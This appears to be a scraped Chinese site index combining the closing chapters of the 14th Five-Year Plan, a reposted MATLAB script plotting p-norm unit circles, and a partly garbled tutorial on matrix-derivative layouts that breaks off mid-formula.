坚持总体国家安全观，实施国家安全战略，维护和塑造国家安全，统筹传统安全和非传统安全，把安全发展贯穿国家发展各领域和全过程，防范和化解影响我国现代化进程的各种风险，筑牢国家安全屏障。 第五十二章 加强国家安全体系和能力建设 坚持政治安全、人民安全、国家利益至上有机统一，以人民安全为宗旨，以政治安全为根本，以经济安全为基础，以军事、科技、文化、社会安全为保障，不断增强国家安全能力。完善集中统一、高效权威的国家安全领导体制，健全国家安全法治体系、战略体系、政策体系、人才体系和运行机制，完善重要领域国家安全立法、制度、政策。巩固国家安全人民防线，加强国家安全宣传教育，增强全民国家安全意识，建立健全国家安全风险研判、防控协同、防范化解机制。健全国家安全审查和监管制度，加强国家安全执法。坚定维护国家政权安全、制度安全、意识形态安全，全面加强网络安全保障体系和能力建设，切实维护新型领域安全，严密防范和严厉打击敌对势力渗透、破坏、颠覆、分裂活动。 第五十三章 强化国家经济安全保障 强化经济安全风险预警、防控机制和能力建设，实现重要产业、基础设施、战略资源、重大科技等关键领域安全可控，着力提升粮食、能源、金融等领域安全发展能力。 第一节 实施粮食安全战略 实施分品种保障策略，完善重要农产品供给保障体系和粮食产购储加销体系，确保口粮绝对安全、谷物基本自给、重要农副产品供应充足。毫不放松抓好粮食生产，深入实施藏粮于地、藏粮于技战略，开展种源“卡脖子”技术攻关，提高良种自主可控能力。严守耕地红线和永久基本农田控制线，稳定并增加粮食播种面积和产量，合理布局区域性农产品应急保供基地。深化农产品收储制度改革，加快培育多元市场购销主体，改革完善中央储备粮管理体制，提高粮食储备调控能力。强化粮食安全省长责任制和“菜篮子”市长负责制，实行党政同责。有效降低粮食生产、储存、运输、加工环节损耗，开展粮食节约行动。积极开展重要农产品国际合作，健全农产品进口管理机制，推动进口来源多元化，培育国际大粮商和农业企业集团。制定粮食安全保障法。 第二节 实施能源资源安全战略 坚持立足国内、补齐短板、多元保障、强化储备，完善产供储销体系，增强能源持续稳定供应和风险管控能力，实现煤炭供应安全兜底、油气核心需求依靠自保、电力供应稳定可靠。夯实国内产量基础，保持原油和天然气稳产增产，做好煤制油气战略基地规划布局和管控。扩大油气储备规模，健全政府储备和企业社会责任储备有机结合、互为补充的油气储备体系。加强煤炭储备能力建设。完善能源风险应急管控体系，加强重点城市和用户电力供应保障，强化重要能源设施、能源网络安全防护。多元拓展油气进口来源，维护战略通道和关键节点安全。培育以我为主的交易中心和定价机制，积极推进本币结算。加强战略性矿产资源规划管控，提升储备安全保障能力，实施新一轮找矿突破战略行动。 第三节 实施金融安全战略 健全金融风险预防、预警、处置、问责制度体系，落实监管责任和属地责任，对违法违规行为零容忍，守住不发生系统性风险的底线。完善宏观审慎管理体系，保持宏观杠杆率以稳为主、稳中有降。加强系统重要性金融机构和金融控股公司监管，强化不良资产认定和处置，防范化解影子银行风险，有序处置高风险金融机构，严厉打击非法金融活动，健全互联网金融监管长效机制。完善债务风险识别、评估预警和有效防控机制，健全债券市场违约处置机制，推动债券市场统一执法，稳妥化解地方政府隐性债务，严惩逃废债行为。完善跨境资本流动管理框架，加强监管合作，提高开放条件下风险防控和应对能力。加强人民币跨境支付系统建设，推进金融业信息化核心技术安全可控，维护金融基础设施安全。 第五十四章 全面提高公共安全保障能力 坚持人民至上、生命至上，健全公共安全体制机制，严格落实公共安全责任和管理制度，保障人民生命安全。 第一节 提高安全生产水平 完善和落实安全生产责任制，建立公共安全隐患排查和安全预防控制体系。建立企业全员安全生产责任制度，压实企业安全生产主体责任。加强安全生产监测预警和监管监察执法，深入推进危险化学品、矿山、建筑施工、交通、消防、民爆、特种设备等重点领域安全整治，实行重大隐患治理逐级挂牌督办和整改效果评价。推进企业安全生产标准化建设，加强工业园区等重点区域安全管理。加强矿山深部开采与重大灾害防治等领域先进技术装备创新应用，推进危险岗位机器人替代。在重点领域推进安全生产责任保险全覆盖。 第二节 严格食品药品安全监管 加强和改进食品药品安全监管制度，完善食品药品安全法律法规和标准体系，探索建立食品安全民事公益诉讼惩罚性赔偿制度。深入实施食品安全战略，加强食品全链条质量安全监管，推进食品安全放心工程建设攻坚行动，加大重点领域食品安全问题联合整治力度。严防严控药品安全风险，构建药品和疫苗全生命周期管理机制，完善药品电子追溯体系，实现重点类别药品全过程来源可溯、去向可追。稳步推进医疗器械唯一标识制度。加强食品药品安全风险监测、抽检和监管执法，强化快速通报和快速反应。 第三节 加强生物安全风险防控 建立健全生物安全风险防控和治理体系，全面提高国家生物安全治理能力。完善国家生物安全风险监测预警体系和防控应急预案制度，健全重大生物安全事件信息统一发布机制。加强动植物疫情和外来入侵物种口岸防控。统筹布局生物安全基础设施，构建国家生物数据中心体系，加强高级别生物安全实验室体系建设和运行管理。强化生物安全资源监管，制定完善人类遗传资源和生物资源目录，建立健全生物技术研究开发风险评估机制。推进生物安全法实施。加强生物安全领域国际合作，积极参与生物安全国际规则制定。 第四节 完善国家应急管理体系 构建统一指挥、专常兼备、反应灵敏、上下联动的应急管理体制，优化国家应急管理能力体系建设，提高防灾减灾抗灾救灾能力。坚持分级负责、属地为主，健全中央与地方分级响应机制，强化跨区域、跨流域灾害事故应急协同联动。开展灾害事故风险隐患排查治理，实施公共基础设施安全加固和自然灾害防治能力提升工程，提升洪涝干旱、森林草原火灾、地质灾害、气象灾害、地震等自然灾害防御工程标准。加强国家综合性消防救援队伍建设，增强全灾种救援能力。加强和完善航空应急救援体系与能力。科学调整应急物资储备品类、规模和结构，提高快速调配和紧急运输能力。构建应急指挥信息和综合监测预警网络体系，加强极端条件应急救援通信保障能力建设。发展巨灾保险。 第五十五章 维护社会稳定和安全 正确处理新形势下人民内部矛盾，加强社会治安防控，编织全方位、立体化、智能化社会安全网。 第一节 健全社会矛盾综合治理机制 坚持和发展新时代“枫桥经验”，构建源头防控、排查梳理、纠纷化解、应急处置的社会矛盾综合治理机制。畅通和规范群众诉求表达、利益协调、权益保障通道，完善人民调解、行政调解、司法调解联动工作体系。健全矛盾纠纷多元化解机制，充分发挥调解、仲裁、行政裁决、行政复议、诉讼等防范化解社会矛盾的作用。完善和落实信访制度，依法及时就地解决群众合理诉求。健全社会矛盾风险防控协同机制。健全社会心理服务体系和危机干预机制。 第二节 推进社会治安防控体系现代化 坚持专群结合、群防群治，提高社会治安立体化、法治化、专业化、智能化水平，形成问题联治、工作联动、平安联创的工作机制，健全社会治安防控体系。继续开展好禁毒人民战争和反恐怖斗争，推动扫黑除恶常态化，严厉打击各类违法犯罪活动，提升打击新型网络犯罪和跨国跨区域犯罪能力。坚持打防结合、整体防控，强化社会治安重点地区排查整治，健全社会治安协调联动机制。推进公安大数据智能化平台建设。完善执法司法权力运行监督和制约机制，健全执法司法人员权益保障机制。建设国门安全防控体系。深化国际执法安全务实合作。 第十六篇 加快国防和军队现代化 实现富国和强军相统一 贯彻习近平强军思想，贯彻新时代军事战略方针，坚持党对人民军队的绝对领导，坚持政治建军、改革强军、科技强军、人才强军、依法治军，加快机械化信息化智能化融合发展，全面加强练兵备战，提高捍卫国家主权、安全、发展利益的战略能力，确保2027年实现建军百年奋斗目标。 第五十六章 提高国防和军队现代化质量效益 加快军事理论现代化，与时俱进创新战争和战略指导，健全新时代军事战略体系，发展先进作战理论。加快军队组织形态现代化，深化国防和军队改革，推进军事管理革命，加快军兵种和武警部队转型建设，壮大战略力量和新域新质作战力量，打造高水平战略威慑和联合作战体系，加强军事力量联合训练、联合保障、联合运用。加快军事人员现代化，贯彻新时代军事教育方针，完善三位一体新型军事人才培养体系，锻造高素质专业化新型军事人才方阵。加快武器装备现代化，聚力国防科技自主创新、原始创新，加速战略性前沿性颠覆性技术发展，加速武器装备升级换代和智能化武器装备发展。 第五十七章 促进国防实力和经济实力同步提升 同国家现代化发展相协调，搞好战略层面筹划，深化资源要素共享，强化政策制度协调，完善组织管理、工作运行、政策制度、人才队伍、风险防控体系，构建一体化国家战略体系和能力。推动重点区域、重点领域、新兴领域协调发展，集中力量实施国防领域重大工程。促进军事建设布局与区域经济发展布局有机结合，更好服务国家安全发展战略需要。深化军民科技协同创新，加强海洋、空天、网络空间、生物、新能源、人工智能、量子科技等领域军民统筹发展，推动军地科研设施资源共享，推进军地科研成果双向转化应用和重点产业发展。强化基础设施共建共用，加强新型基础设施统筹建设，加大经济建设项目贯彻国防要求力度。加快建设现代军事物流体系和资产管理体系。加强军地人才联合培养，健全军地人才交流使用、资格认证等制度。优化国防科技工业布局，加快标准化通用化进程。推进武器装备市场准入、空中交通管理等改革。完善国防动员体系，加强应急应战协同，健全强边固防机制，强化全民国防教育，巩固军政军民团结。维护军人军属合法权益，让军人成为全社会尊崇的职业。 第十七篇 加强社会主义民主法治建设 健全党和国家监督制度 坚持中国共产党领导、人民当家作主、依法治国有机统一，推进中国特色社会主义政治制度自我完善和发展。 第五十八章 发展社会主义民主 坚持和完善党总揽全局、协调各方的领导制度体系，把党的领导落实到国家发展各领域各方面各环节。坚持和完善人民代表大会制度，加强人大对“一府一委两院”的监督，保障人民依法通过各种途径和形式管理国家事务、管理经济文化事业、管理社会事务。坚持和完善中国共产党领导的多党合作和政治协商制度，提高中国特色社会主义参政党建设水平，加强人民政协专门协商机构建设，发挥社会主义协商民主独特优势，提高建言资政和凝聚共识水平。全面贯彻党的民族政策，坚持和完善民族区域自治制度，铸牢中华民族共同体意识，促进各民族共同团结奋斗、共同繁荣发展。全面贯彻党的宗教工作基本方针，坚持我国宗教中国化方向，积极引导宗教与社会主义社会相适应。健全基层群众自治制度，增强群众自我管理、自我服务、自我教育、自我监督实效。发挥工会、共青团、妇联等人民团体作用，把各自联系的群众紧紧凝聚在党的周围。完善大统战工作格局，促进政党关系、民族关系、宗教关系、阶层关系、海内外同胞关系和谐，巩固和发展大团结大联合局面。全面贯彻党的侨务政策，凝聚侨心、服务大局。 第五十九章 全面推进依法治国 坚定不移走中国特色社会主义法治道路，坚持依法治国、依法执政、依法行政共同推进，一体建设法治国家、法治政府、法治社会，实施法治中国建设规划。健全保障宪法全面实施的体制机制，加强宪法实施和监督，落实宪法解释程序机制，推进合宪性审查。完善立法体制机制，加强重点领域、新兴领域、涉外领域立法，立改废释纂并举，完善以宪法为核心的中国特色社会主义法律体系。实施法治政府建设实施纲要，坚持和完善重大行政决策程序制度，深化行政执法体制改革，严格规范公正文明执法，规范执法自由裁量权，推进行政复议体制改革。深化司法体制综合配套改革，完善审判制度、检察制度、刑罚执行制度、律师制度，全面落实司法责任制，加强对司法活动监督，深化执行体制改革，促进司法公正。实施法治社会建设实施纲要，加强社会主义法治文化建设，深入开展法治宣传教育，实施“八五”普法规划，完善公共法律服务体系、法律援助和国家司法救助制度。全面加强人权司法保护，促进人权事业全面发展。加强涉外法治体系建设，加强涉外法律人才培养。 第六十章 完善党和国家监督体系 健全党统一领导、全面覆盖、权威高效的监督体系，形成决策科学、执行坚决、监督有力的权力运行机制。落实全面从严治党主体责任、监督责任，强化政治监督，深化政治巡视并强化整改落实。推进纪律监督、监察监督、派驻监督、巡视监督统筹衔接，以党内监督为主导、推动各类监督贯通协调，形成常态长效的监督合力，使监督体系更好融入国家治理体系。深化纪检监察体制改革，加强上级纪委监委对下级纪委监委的领导，推进纪检监察工作规范化、法治化，发挥监督保障执行、促进完善发展作用。完善权力配置和运行制约机制，健全分事行权、分岗设权、分级授权、定期轮岗制度，完善党务、政务、司法和各领域办事公开制度，健全发现问题、纠正偏差、精准问责有效机制，构建全覆盖的责任制度和监督制度。坚持无禁区、全覆盖、零容忍，一体推进不敢腐、不能腐、不想腐，营造风清气正的良好政治生态和发展环境。深化反腐败国际合作。锲而不舍落实中央八项规定精神，完善作风建设长效机制，持续纠治形式主义、官僚主义，切实防止享乐主义、奢靡之风反弹回潮，坚决整治群众身边的腐败和不正之风。 第十八篇 坚持“一国两制” 推进祖国统一 保持香港、澳门长期繁荣稳定，推进两岸关系和平发展和祖国统一，共创中华民族伟大复兴的美好未来。 第六十一章 保持香港、澳门长期繁荣稳定 全面准确贯彻“一国两制”、“港人治港”、“澳人治澳”、高度自治的方针，坚持依法治港治澳，维护宪法和基本法确定的特别行政区宪制秩序，落实中央对特别行政区全面管治权，落实特别行政区维护国家安全的法律制度和执行机制，维护国家主权、安全、发展利益和特别行政区社会大局稳定，坚决防范和遏制外部势力干预港澳事务，支持港澳巩固提升竞争优势，更好融入国家发展大局。 第一节 支持港澳巩固提升竞争优势 支持香港提升国际金融、航运、贸易中心和国际航空枢纽地位，强化全球离岸人民币业务枢纽、国际资产管理中心及风险管理中心功能。支持香港建设国际创新科技中心、亚太区国际法律及解决争议服务中心、区域知识产权贸易中心，支持香港服务业向高端高增值方向发展，支持香港发展中外文化艺术交流中心。支持澳门丰富世界旅游休闲中心内涵，支持粤澳合作共建横琴，扩展中国与葡语国家商贸合作服务平台功能，打造以中华文化为主流、多元文化共存的交流合作基地，支持澳门发展中医药研发制造、特色金融、高新技术和会展商贸等产业，促进经济适度多元发展。 第二节 支持港澳更好融入国家发展大局 完善港澳融入国家发展大局、同内地优势互补、协同发展机制。支持港澳参与、助力国家全面开放和现代化经济体系建设，打造共建“一带一路”功能平台。深化内地与港澳经贸、科创合作关系，深化并扩大内地与港澳金融市场互联互通。高质量建设粤港澳大湾区，深化粤港澳合作、泛珠三角区域合作，推进深圳前海、珠海横琴、广州南沙、深港河套等粤港澳重大合作平台建设。加强内地与港澳各领域交流合作，完善便利港澳居民在内地发展和生活居住的政策措施，加强宪法和基本法教育、国情教育，增强港澳同胞国家意识和爱国精神。支持港澳同各国各地区开展交流合作。 第六十二章 推进两岸关系和平发展和祖国统一 坚持一个中国原则和“九二共识”，以两岸同胞福祉为依归，推动两岸关系和平发展、融合发展，高度警惕和坚决遏制“台独”分裂活动。 第一节 深化两岸融合发展 完善保障台湾同胞福祉和在大陆享受同等待遇的制度和政策，持续出台实施惠台利民政策措施，让台湾同胞分享发展机遇，参与大陆经济社会发展进程。支持台商台企参与“一带一路”建设和国家区域协调发展战略。推进两岸金融合作，支持符合条件的台资企业在大陆上市。推进海峡两岸产业合作区、平潭综合实验区、昆山深化两岸产业合作试验区等两岸合作平台建设。支持福建探索海峡两岸融合发展新路，加快两岸融合发展示范区建设。加强两岸产业合作，打造两岸共同市场，壮大中华民族经济。 第二节 加强两岸人文交流 积极促进两岸交流合作和人员往来，加深相互理解，增进互信认同。推动两岸文化教育、医疗卫生等领域交流合作，促进社会保障和公共资源共享，支持两岸邻近或条件相当地区基本公共服务均等化、普惠化、便捷化，促进两岸同胞共同传承和创新发展中华优秀传统文化。加强两岸基层和青少年交流，鼓励台湾青年来大陆追梦、筑梦、圆梦。团结广大台湾同胞共同反对“台独”分裂活动，维护和推动两岸关系和平发展，致力中华民族伟大复兴。 第十九篇 加强规划实施保障 坚持党的全面领导，健全规划实施保障机制，更好履行政府职责，最大程度激发各类主体的活力和创造力，形成全面建设社会主义现代化国家的强大合力。 第六十三章 加强党中央集中统一领导 贯彻党把方向、谋大局、定政策、促改革的要求，深入学习贯彻习近平新时代中国特色社会主义思想，增强“四个意识”、坚定“四个自信”、做到“两个维护”，不断提高政治判断力、政治领悟力、政治执行力，把党的领导贯穿到规划实施的各领域和全过程，确保党中央重大决策部署贯彻落实。充分发挥全面从严治党引领保障作用，把完善党和国家监督体系融入规划实施之中。完善上下贯通、执行有力的组织体系，提高各级领导班子和干部适应新时代新要求抓改革、促发展、保稳定的政治能力和专业化水平。 激发全社会参与规划实施的积极性，注重发挥工会、共青团、妇联等作用，充分发挥民主党派、工商联和无党派人士作用，最大限度凝聚全社会共识和力量。构建适应高质量发展要求的内生激励机制，健全激励导向的绩效评价考核机制和尽职免责机制，调动广大干部特别是基层干部的积极性、主动性、创造性。 第六十四章 健全统一规划体系 加快建立健全以国家发展规划为统领，以空间规划为基础，以专项规划、区域规划为支撑，由国家、省、市县级规划共同组成，定位准确、边界清晰、功能互补、统一衔接的国家规划体系。 第一节 强化国家发展规划的统领作用 更好发挥国家发展规划战略导向作用，强化空间规划、专项规划、区域规划对本规划实施的支撑。按照本规划确定的国土空间开发保护要求和重点任务，制定实施国家级空间规划，为重大战略任务落地提供空间保障。聚焦本规划确定的战略重点和主要任务，在科技创新、数字经济、绿色生态、民生保障等领域，制定实施一批国家级重点专项规划，明确细化落实发展任务的时间表和路线图。根据本规划确定的区域发展战略任务，制定实施一批国家级区域规划实施方案。加强地方规划对本规划提出的发展战略、主要目标、重点任务、重大工程项目的贯彻落实。 第二节 加强规划衔接协调 健全目录清单、编制备案、衔接协调等规划管理制度，制定“十四五”国家级专项规划等目录清单，依托国家规划综合管理信息平台推进规划备案，将各类规划纳入统一管理。建立健全规划衔接协调机制，报请党中央、国务院批准的规划及省级发展规划报批前须与本规划进行衔接，确保国家级空间规划、专项规划、区域规划等各级各类规划与本规划在主要目标、发展方向、总体布局、重大政策、重大工程、风险防控等方面协调一致。 第六十五章 完善规划实施机制 加强对本规划实施的组织、协调和督导，建立健全规划实施监测评估、政策保障、考核监督机制。 第一节 落实规划实施责任 各地区、各部门要根据职责分工，制定本规划涉及本地区、本部门的主要目标任务实施方案。本规划确定的约束性指标、重大工程项目和公共服务、生态环保、安全保障等领域任务，要明确责任主体和进度要求，合理配置公共资源，引导调控社会资源，确保如期完成。本规划提出的预期性指标和产业发展、结构调整等领域任务，主要依靠发挥市场主体作用实现，各级政府要创造良好的政策环境、体制环境和法治环境。年度计划要贯彻本规划提出的发展目标和重点任务，将本规划确定的主要指标分解纳入年度计划指标体系，设置年度目标并做好年度间综合平衡，合理确定年度工作重点。 第二节 加强规划实施监测评估 开展规划实施情况动态监测、中期评估和总结评估，中期评估和总结评估情况按程序提请中央政治局常委会审议，并依法向全国人民代表大会常务委员会报告规划实施情况，自觉接受人大监督。发挥国家监察机关和审计机关对推进规划实施的监督作用。规划实施情况纳入各有关部门、地方领导班子和干部评价体系，作为改进政府工作的重要依据。需要对本规划进行调整时，由国务院提出调整方案，报全国人民代表大会常务委员会批准。 第三节 强化政策协同保障 坚持规划定方向、财政作保障、金融为支撑、其他政策相协调，着力构建规划与宏观政策协调联动机制。按照本规划目标任务、结合经济发展形势，合理确定宏观政策取向。坚持公共财政服从和服务于公共政策，增强国家重大战略任务财力保障，加强中期财政规划和年度预算、政府投资计划与本规划实施的衔接协调，中央财政性资金优先投向本规划确定的重大任务和重大工程项目。坚持项目跟着规划走、资金和要素跟着项目走，依据本规划制定重大工程项目清单，对清单内工程项目简化审批核准程序，优先保障规划选址、土地供应和资金需求，单体重大工程项目用地需求由国家统一保障。 第四节 加快发展规划立法 坚持依法制定规划、依法实施规划的原则，将党中央、国务院关于统一规划体系建设和国家发展规划的规定、要求和行之有效的经验做法以法律形式固定下来，加快出台发展规划法，强化规划编制实施的法治保障。","tags":""},{"title":"P范数单位圆的绘制--matlab","url":"/20240509/p-fan-shu-dan-wei-yuan-de-hui-zhi-matlab/","text":"转载自 P范数单位圆的绘制–matlab 1234567891011121314151617181920212223242526272829303132333435363738%--------------------------------------------------------%%----------不同范数的单位圆-------------------------------%%----------aresmiki,southwest jiaotong university -------%%-----------2016/12/7-----------------------------------%% Given a vector space V over a subfield F of the complex numbers, a norm on V is a function p: V → R with the following properties:[1]%% For all a ∈ F and all u, v ∈ V,%% p(av) = |?a?| p(v), (absolute homogeneity or absolute scalability).% p(u + v) ≤ p(u) + p(v) (triangle inequality or subadditivity).% If p(v) = 0 then v is the zero vector (separates points).% By the first axiom, absolute homogeneity, we have p(0) = 0 and p(?v) = p(v), so that by the triangle inequality%% p(v) ≥ 0 (non-negativity).%clcclear allr=1; %定义单位圆半径，一般范数单位圆定义为1x=-1:0.001:1;%y=-1:0.001:1;pnorm=1;p=[0.3,0.5,1,2,3,4,5,6,7,8]; %p范数取值for i=1:length(p)y(i,:)=(r^p(i)-abs(x).^p(i)).^(1/p(i));endxx=repmat(x,length(p),1);xx=[xx,-xx];yy=[y,-y];figureplot(xx&#x27;,yy&#x27;)axis(&#x27;equal&#x27;);legend(strcat(&#x27;p=&#x27;,num2str(p(1))),strcat(&#x27;p=&#x27;,num2str(p(2))),strcat(&#x27;p=&#x27;,num2str(p(3))),strcat(&#x27;p=&#x27;,num2str(p(4))),strcat(&#x27;p=&#x27;,num2str(p(5))));","tags":""},{"title":"矩阵求导","url":"/20240509/ju-zhen-qiu-dao/","text":"矩阵求导的本质与分子布局、分母布局的本质（矩阵求导——本质篇） ※前言 在一个多月前，针对有同学关于矩阵求导中分子布局、分母布局两者的区别的疑问，我写了如下的这篇答案。 虽然这篇答案给出了几个结论，但是写的没有很严谨，并没有说明矩阵求导的本质与分子布局、分母布局的本质。 所以，在接下来这篇文章中，我将更严谨地说明矩阵求导的本质与分子布局、分母布局的本质。希望对初学的同学、想理解本质的同学提供一些帮助。 注1：看懂本文只需了解本科阶段高等数学的偏导如何求、本科阶段线性代数的矩阵*的定义，无需任何其他知识。* 注2：本文若无特殊说明，则约定向量均为*列向量，*如 注3：本文仅考虑实数，不考虑复数。** ※函数与标量、向量、矩阵[1] 考虑一个函数 针对 的类型、 的类型，我们可以将这个函数 分为不同的种类。 1、 是一个标量 我们称 是一个**实值标量函数。**用细体小写字母 f 表示。 1.1 是一个标量 我们称 的变元是**标量。**用细体小写字母 x 表示。 例1： 1.2 是一个向量 我们称 的变元是向量。用粗体小写字母 表示。 **例2：**设 $$f(\\pmb{x})=a_1x_12+a_2x_22+a_3x_3^2+a_4x_1x_2 (e.g.2)$$ 1.3 是一个矩阵 我们称 的变元是矩阵。用粗体大写字母 表示。 **例3：**设 $\\pmb{X}{3\\times 2}=(x{ij})_{i=1,j=1}^{3,2}$ $$f(\\pmb{X})=a_1x_{11}2+a_2x_{12}2+a_3x_{21}2+a_4x_{22}2+a_5x_{31}2+a_6x_{32}2 (e.g.3)$$ 2、 是一个向量 我们称 是一个实向量函数 。用粗体小写字母 表示。 含义： 是由若干个 组成的一个向量。 同样地，变元分三种：标量、向量、矩阵。这里的符号仍与上面相同。 2.1 标量变元 例4： 2.2 向量变元 **例5：**设 $$\\pmb{f}{3\\times1}(\\pmb{x})= = \\begin{bmatrix} x{1}+x_{2}+x_{3}\\ x_{1}^2+2x_{2}+2x_{3}\\ x_{1}x_{2}+x_{2}+x_{3} \\end{bmatrix} (e.g.5)$$ 2.3 矩阵变元 **例6：**设 $\\pmb{X}{3\\times 2}=(x{ij})_{i=1,j=1}^{3,2}$ $$\\pmb{f}{3\\times1}(\\pmb{X})= = \\begin{bmatrix} x{11}+x_{12}+x_{21}+x_{22}+x_{31}+x_{32}\\ x_{11}+x_{12}+x_{21}+x_{22}+x_{31}+x_{32}+x_{11}x_{12}\\ 2x_{11}+x_{12}+x_{21}+x_{22}+x_{31}+x_{32}+x_{11}x_{12} \\end{bmatrix} (e.g.6)$$ 3、 是一个矩阵 我们称 是一个实矩阵函数 。用粗体大写字母 表示。 含义： 是由若干个 f 组成的一个矩阵。 同样地，变元分三种：标量、向量、矩阵。这里的符号仍与上面相同。 3.1 标量变元 例7： $$\\pmb{F}{3\\times2}(x)= \\begin{bmatrix} f{11}(x) &amp; f_{12}(x)\\ f_{21}(x) &amp; f_{22}(x)\\ f_{31}(x) &amp; f_{32}(x)\\ \\end{bmatrix} = (e.g.7)$$ 3.2 向量变元 **例8：**设 $$\\pmb{F}{3\\times2}(\\pmb{x})= \\begin{bmatrix} f{11}(\\pmb{x}) &amp; f_{12}(\\pmb{x})\\ f_{21}(\\pmb{x}) &amp; f_{22}(\\pmb{x})\\ f_{31}(\\pmb{x}) &amp; f_{32}(\\pmb{x})\\ \\end{bmatrix} = (e.g.8)$$ 3.3 矩阵变元 **例9：**设 $\\pmb{X}{3\\times 2}=(x{ij})_{i=1,j=1}^{3,2}$ $$ \\pmb{F}{3\\times2}(\\pmb{X})= \\begin{bmatrix} f{11}(\\pmb{X}) &amp; f_{12}(\\pmb{X})\\ f_{21}(\\pmb{X}) &amp; f_{22}(\\pmb{X})\\ f_{31}(\\pmb{X}) &amp; f_{32}(\\pmb{X})\\ \\end{bmatrix}= (e.g.9)$$ 4、总结 函数与标量、向量、矩阵 ※矩阵求导的本质 我们在高等数学[2]中学过，对于一个多元函数 例10： 我们可以将 f 对 的偏导分别求出来**，即：** 矩阵求导也是一样的，本质就是 中的每个 f 分别对变元中的每个元素逐个求偏导，只不过写成了向量、矩阵形式而已。 对于 (e.g.10) ，我们把得出的3个结果写成列向量形式： 一个矩阵求导以列向量形式展开的雏形就出现了。 当然我们也可以以行向量形式展开： 所以，如果 中有 m 个 f ，变元中有 n 个元素，那么，每个 f 对变元中的每个元素逐个求偏导后，我们就会产生 个结果。 这就是矩阵求导的本质。 至于这 个结果的布局，是写成行向量，还是写成列向量，还是写成矩阵，就是我们接下来要讨论的事情。 ※矩阵求导结果的布局 不严谨地说，从直观上看： 分子布局，就是分子是列向量形式，分母是行向量形式，如 (2) 式。如果这里的 是实向量函数 的话，结果就是 的矩阵了： $$\\frac{\\partial \\pmb{f}{2\\times1}(\\pmb{x})}{\\partial \\pmb{x}^T{3\\times1}}= _{2\\times 3} (3)$$ 分母布局，就是分母是列向量形式，分子是行向量形式，如 (1) 式。如果这里的 是实向量函数 的话，结果就是 的矩阵了： $$\\frac{\\partial \\pmb{f}^T_{2\\times1}(\\pmb{x})}{\\partial \\pmb{x}{3\\times1}}= {3\\times 2} (4)$$ 直观上理解了之后，我们针对不同类型的 ，不同类型的变元，给出严谨的布局说明。（这里不讨论标量变元的实值标量函数 f(x) ，因为结果就是一个元素嘛~） 1、向量变元的实值标量函数 1.1 行向量偏导形式（又称行偏导向量形式）[3] 1.2 梯度向量形式（又称列向量偏导形式、列偏导向量形式）[4] 这两种形式互为转置。 2、矩阵变元的实值标量函数 $f(\\pmb{X}) , \\pmb{X}{m\\times n}=(x{ij})_{i=1,j=1}^{m,n}$ 先介绍一个符号 ，作用是将矩阵 按列堆栈来向量化。 解释一下， 就是把矩阵 的第 1 列，第 2 列，直到第 n 列取出来，然后按顺序组成一个列向量，即： 2.1 行向量偏导形式（又称行偏导向量形式）[3:1] 即先把矩阵变元 按 向量化，转换成向量变元，再对该向量变元使用 (5) 式： $$\\text{D}{\\text{vec}\\pmb{X}}f(\\pmb{X})= \\frac{\\partial f(\\pmb{X})}{\\partial \\text{vec}^T(\\pmb{X})} = [ \\frac{\\partial f}{\\partial x{11}},\\frac{\\partial f}{\\partial x_{21}},\\cdots,\\frac{\\partial f}{\\partial x_{m1}},\\frac{\\partial f}{\\partial x_{12}},\\frac{\\partial f}{\\partial x_{22}},\\cdots,\\frac{\\partial f}{\\partial x_{m2}},\\cdots,\\frac{\\partial f} {\\partial x_{1n}},\\frac{\\partial f}{\\partial x_{2n}},\\cdots,\\frac{\\partial f}{\\partial x_{mn}} ] (8)$$ 2.2 矩阵形式[3:2] 即先把矩阵变元 进行转置，再对转置后的每个位置的元素逐个求偏导，结果布局和转置布局一样。 $$\\text{D}{\\pmb{X}}f(\\pmb{X})= \\frac{\\partial f(\\pmb{X})}{\\partial \\pmb{X}^T{m\\times n}}= _{n\\times m} \\ (9)$$ 2.3 梯度向量形式（又称列向量偏导形式、列偏导向量形式）[4:1] 即先把矩阵变元 按 向量化，转换成向量变元，再对该变元使用 (6) 式： 2.4 梯度矩阵形式[4:2] 直接对原矩阵变元 的每个位置的元素逐个求偏导，结果布局和原矩阵布局一样。 $$\\nabla_{\\pmb{X}}f(\\pmb{X})= \\frac{\\partial f(\\pmb{X})}{\\partial \\pmb{X}{m\\times n}} = \\begin{bmatrix} \\frac{\\partial f}{\\partial x{11}}&amp;\\frac{\\partial f}{\\partial x_{12}}&amp;\\cdots&amp;\\frac{\\partial f}{\\partial x_{1n}} \\ \\frac{\\partial f}{\\partial x_{21}}&amp;\\frac{\\partial f}{\\partial x_{22}}&amp; \\cdots &amp; \\frac{\\partial f}{\\partial x_{2n}}\\ \\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots\\ \\frac{\\partial f} {\\partial x_{m1}}&amp;\\frac{\\partial f}{\\partial x_{m2}}&amp;\\cdots&amp;\\frac{\\partial f}{\\partial x_{mn}} \\end{bmatrix}_{m\\times n} \\ (11)$$ 2.5 一些发现 2.5.1 转置 (8) 式与 (10) 式互为转置； (9) 式与 (11) 式互为转置。 2.5.2 相等 当矩阵变元 本身就是一个列向量 时， (5) 式、 (8) 式、 (9) 式相等； (6) 式、 (10) 式、 (11) 式相等；当然，前三个式子与后三个式子互为转置。 这一发现说明，对于向量变元的实值标量函数 ，结果布局本质上有两种形式，一种是 矩阵（已经成行向量了）形式，一种是梯度矩阵（已经成列向量了）形式。两种形式互为转置。 3、矩阵变元的实矩阵函数 $\\pmb{F}(\\pmb{X}) , \\pmb{X}{m\\times n}=(x{ij}){i=1,j=1}^{m,n}， \\pmb{F}{p\\times q}=(f_{ij})_{i=1,j=1}^{p,q}$ 3.1 矩阵形式[5] 即先把矩阵变元 按向量化，转换成向量变元： 再把实矩阵函数 按向量化，转换成实向量函数： 这样，我们就把一个矩阵变元的实矩阵函数 ，转换成了向量变元的实向量函数 。接着，对照 (3) 式写出结果布局为 的矩阵： $$\\text{D}{\\pmb{X}}\\pmb{F}(\\pmb{X}) =\\frac{\\partial \\text{vec}{pq\\times 1}(\\pmb{F}{}(\\pmb{X}))}{\\partial \\text{vec}^T{mn\\times 1}\\pmb{X}} = _{pq\\times mn} \\ (13)$$ 3.2 梯度矩阵形式[6] 即先把矩阵变元 按向量化，转换成向量变元： 再把实矩阵函数 按向量化，转换成实向量函数： 这样，我们就把一个矩阵变元的实矩阵函数 ，转换成了向量变元的实向量函数 。接着，对照 (4) 式写出结果布局为 的矩阵： $$\\nabla_{\\pmb{X}}\\pmb{F}(\\pmb{X}) =\\frac{\\partial \\text{vec}{pq\\times 1}^T(\\pmb{F}{}(\\pmb{X}))}{\\partial \\text{vec}{mn\\times 